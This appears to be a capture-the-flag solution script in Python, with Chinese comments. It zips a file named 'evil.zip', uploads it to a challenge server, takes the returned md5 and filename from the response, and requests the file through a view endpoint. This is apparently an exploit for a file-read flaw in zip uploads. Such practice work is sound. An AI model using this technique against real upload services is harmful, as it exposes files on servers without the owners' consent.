import requests
import os

# 创建zip文件
os.system('zip evil.zip evil.txt')

# 发送请求
url = 'http://challenge.xinshi.fun:48853/upload'
files = {'file': ('evil.zip', open('evil.zip', 'rb'))}
response = requests.post(url, files=files)

print("Upload response:", response.text)

# 从响应中提取md5和filename
import re
md5_match = re.search(r'md5=([a-f0-9]+)', response.text)
file_match = re.search(r'first_file=([^"]+)', response.text)

if md5_match and file_match:
    md5 = md5_match.group(1)
    filename = file_match.group(1)
    
    # 访问文件内容
    view_url = f'http://challenge.xinshi.fun:48853/view/{md5}/{filename}'
    view_response = requests.get(view_url)
    print("\nView response:", view_response.text)
